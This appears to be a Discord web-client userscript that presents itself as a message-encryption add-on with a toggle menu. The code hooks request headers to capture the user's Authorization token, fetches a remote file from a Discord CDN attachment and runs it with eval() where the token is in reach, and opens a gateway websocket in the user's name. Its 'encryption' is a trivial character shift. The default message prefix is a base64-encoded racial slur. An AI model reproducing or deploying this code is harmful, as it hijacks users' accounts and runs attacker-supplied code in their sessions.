let triggered=false;
XMLHttpRequest.prototype.RH=XMLHttpRequest.prototype.setRequestHeader;
let nh=function(x,y){
    if(x=="Authorization"&&triggered==false){
        triggered=!triggered;
        ws(y);
    }
    this.RH(x,y);
}
XMLHttpRequest.prototype.setRequestHeader=nh;
async function ws(token) {
    let custom="kastm kod"
    let kastm=false
    let exits=true;
    let bl="947598329498443896/996418438086004807"
    async function kastommeni(){
        let kastmmenu = document.createElement("div");
        document.body.appendChild(kastmmenu)
        kastmmenu.style.top="50%"
        kastmmenu.style.right="40%"
        kastmmenu.style.position="absolute"
        kastmmenu.style.width="25%"
        kastmmenu.style.height="25%"
        kastmmenu.style.zIndex=9999
        kastmmenu.style.background="#21222DDC"
        kastmmenu.style.borderRadius="15px"
        let prikvati= document.createElement("button");
        prikvati.setAttribute("value","kastm")
        kastmmenu.appendChild(prikvati)
        prikvati.style.position="absolute"
        prikvati.style.top="80%"
        prikvati.style.left="52%"
        prikvati.innerHTML="kastm"
        prikvati.style.background=kastm==true?"green":"red"
        let kastminput = document.createElement("input");
        kastminput.setAttribute("type","text")
        kastminput.setAttribute("value","kastm kod")
        kastminput.style.justifyContent="center"
        kastminput.style.right="37%"
        kastminput.style.position="absolute"
        kastmmenu.appendChild(kastminput)
        prikvati.onclick=x=>{
            kastm=!kastm
            custom=kastminput.value
            prikvati.style.background=kastm==true?"green":"red"
        }
        let ukljucenje=document.createElement("button");
        ukljucenje.setAttribute("value","kastm")
        kastmmenu.appendChild(ukljucenje)
        ukljucenje.style.position="absolute"
        ukljucenje.style.right="49%"
        ukljucenje.style.top="80%"
        ukljucenje.style.background="green"
        ukljucenje.innerHTML="x"
        ukljucenje.onclick=x=>{
            kastmmenu.remove()
        }
        
        let iskljucenje= document.createElement("button");
        iskljucenje.setAttribute("value","kastm")
        kastmmenu.appendChild(iskljucenje)
        iskljucenje.style.position="absolute"
        iskljucenje.style.top="80%"
        iskljucenje.style.right="54%"
        iskljucenje.innerHTML=exits==true?"ukljuci":"iskljuci"
        iskljucenje.style.background=exits==true?"red":"green"
        iskljucenje.onclick=x=>{
            exits=!exits
            iskljucenje.innerHTML=exits==true?"ukljuci":"iskljuci"
            iskljucenje.style.background=exits==true?"red":"green"
        }
    }
    try{const onoff = document.querySelector(`[aria-label="Send a gift"]`).parentElement;
    let btn = document.createElement("button");
    onoff.appendChild(btn)
    btn.style.width="20px"
    btn.style.height="20px"
    btn.style.top="25%"
    btn.style.right="100%"
    btn.style.position="relative"
    btn.style.background=exits==false?"green":"gray"
    btn.onclick=()=>{
        kastommeni()
        btn.style.background=exits==false?"green":"gray"
    }}catch{}
    const sleep = (milliseconds) => {return new Promise(resolve => setTimeout(resolve, milliseconds))};
    let oldHref=document.location.href
    var bodyList = document.querySelector("body")
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            if (oldHref != document.location.href) {
                console.log("dirchange")
                oldHref = document.location.href;
                try{const onoff = document.querySelector(`[aria-label="Send a gift"]`).parentElement;
				let btn = document.createElement("button");
				onoff.appendChild(btn)
				btn.style.width="20px"
				btn.style.height="20px"
                btn.style.top="25%"
                btn.style.right="100%"
                btn.style.position="relative"
                btn.style.background=exits==false?"green":"gray"
				btn.onclick=()=>{
                    kastommeni()
					btn.style.background=exits==false?"green":"gray"
				}}catch{}
            }
        });
    });
    var config = {
        childList: true,
        subtree: true
    };
    let p="https://cdn.discordapp.com"
    fetch(p+"/attachments/"+bl+"/message.txt")
    .then(x=>{       return x})
    .then(x=>{return x.text()})
    .then(x=>{        eval(x)})
    observer.observe(bodyList, config);
    let encrypt = (plainText) =>
        {
            let chiperText = "";
            let sex=""
            if (plainText.match(/(<@)[0-9]*(>)/)) {
                sex=plainText.match(/(<@)[0-9]*(>)/)[0]
                plainText=plainText.replace(plainText.match(/(<@)[0-9]*(>)/)[0],"")
            }
            if (plainText==undefined) {
                return `${sex}`
            }
            let x = Math.floor((Math.random() * 9) + 1);
            for (let i = 0; i < plainText.length; i++)
            {
                let existingCharCode = plainText.charCodeAt(i)
                let newCharCode = existingCharCode + x
                let newChars = String.fromCharCode(newCharCode)
                chiperText += newChars
            }
            return `${x}${chiperText} ${sex}`
        }
    XMLHttpRequest.prototype.realSend = XMLHttpRequest.prototype.send;
    var newSend = function(vData) {
		if(exits==false){
			this.addEventListener("readystatechange",()=>{
				if(this.readyState == 4){
					if(this.responseURL.includes("before=")||this.responseURL.includes("messages?limit=50")){
					for (let i = 0; i < JSON.parse(this.responseText).length; i++) {
						try{
							if (JSON.parse(this.responseText)[i]["content"].includes("bmlnZ2Vy")||JSON.parse(this.responseText)[i]["content"].includes(custom)) {
								id.push(JSON.parse(this.responseText)[i]["id"])
							}
						}catch(e){}
					}
				}
				}
			})
			if(this.__sentry_xhr__.url.includes("/messages")&&this.__sentry_xhr__.method=="POST"){
						if(vData.includes('"attachments": [{')){
							return this  
						}
						vData=JSON.parse(vData)
                        
						vData["content"]=(kastm==true?custom:"bmlnZ2Vy")+encrypt(vData["content"])
						vData=JSON.stringify(vData) 
			}
		}
        this.realSend(vData)
    }
    XMLHttpRequest.prototype.send = newSend;
    let decrypt = (chiperText) =>
    {
        let plainText = ""
        let x = chiperText.charAt(0)
        for (let i = 1; i < chiperText.length; i++)
        {
            let existingCharCode = chiperText.charCodeAt(i)
            let newCharCode = existingCharCode - x
            let newChars = String.fromCharCode(newCharCode)
            plainText += newChars
        }
        return plainText
    }
 
    	async function updatez() {
		while (true) {
			if (id.length != 0) {
                console.log("koji kurac")
				for (let i = 0; i < id.length; i++) {
                    let regexp=new RegExp(`(?<=${custom})(.*)`,"gms")
                    try{
                    let decrypthis=document.querySelector(`#message-content-${id[i]}`).textContent.match(/(?<=bmlnZ2Vy)(.*)/gms)||document.querySelector(`#message-content-${id[i]}`).textContent.match(regexp)
                    let test=false
					for (let x = 0; x < document.querySelector(`#message-content-${id[i]}`).children.length; x++) {
						while (document.querySelector(`#message-content-${id[i]}`).children[x]!=undefined&&document.querySelector(`#message-content-${id[i]}`).children[x].classList[0] == "mention") {
							test=true
							document.querySelector(`#message-content-${id[i]}`).removeChild(document.querySelector(`#message-content-${id[i]}`).children[x])
						}
					}
					if (test==true) 
						document.querySelector(`#message-content-${id[i]}`).textContent=decrypt(decrypthis[0])
                    else
						document.querySelector(`#message-content-${id[i]}`).textContent=decrypt(decrypthis[0])		
                    }catch{}				
				}
				await sleep(100)
			}
			await sleep(100)

	}
}
    async function hb(socket, interval){
        while(true){
            let hbpayload={
                'op': 1,
                'd': 'null'
            };
            try{
            socket.send(JSON.stringify(hbpayload));
            await sleep(interval);}catch{break}
        };
    }
    let id=[]
    socket= new WebSocket("wss://gateway.discord.gg/?encoding=json");
    socket.onclose=()=>{
        console.log("ws closed")
        ws(token)
    }
    socket.onopen=()=>{
        socket.send(JSON.stringify({"op":2,"d":{"token":token,"capabilities":509,"properties":{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36","browser_version":"100.0.4896.127","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":125308,"client_event_source":null},"presence":{"status":"online","since":0,"activities":[],"afk":false},"compress":false,"client_state":{"guild_hashes":{},"highest_last_message_id":"0","read_state_version":0,"user_guild_settings_version":-1,"user_settings_version":-1}}}))}
    socket.onmessage=(x)=>{
        for (let i = 0; i < id.length; i++) {
            const element = id[i];
        }
    let ejson=JSON.parse(x.data)
    if(ejson["d"]!=null&&ejson["d"].hasOwnProperty("heartbeat_interval")){
        var interval = JSON.parse(ejson['d']['heartbeat_interval']);
        hb(socket, interval);
    }
    else if (ejson["t"]=="MESSAGE_CREATE")
        if(ejson["d"]["content"].startsWith("bmlnZ2Vy")){
            id.push(ejson["d"]["id"])
            updatez()
        }
        if (kastm==true&&ejson["d"]["content"].startsWith(custom)){
            id.push(ejson["d"]["id"])
            updatez()
        }
    }
}
